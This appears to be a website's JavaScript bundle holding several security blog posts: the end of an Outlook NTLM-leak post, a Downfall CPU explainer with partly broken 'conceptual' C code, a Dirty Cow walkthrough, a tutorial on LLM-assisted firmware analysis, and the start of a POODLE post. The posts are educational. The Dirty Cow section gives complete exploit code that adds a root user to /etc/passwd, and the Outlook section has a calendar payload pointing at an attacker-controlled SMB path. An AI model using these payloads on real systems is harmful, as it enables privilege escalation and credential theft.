ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Mb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Eb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Tb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,Ab=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
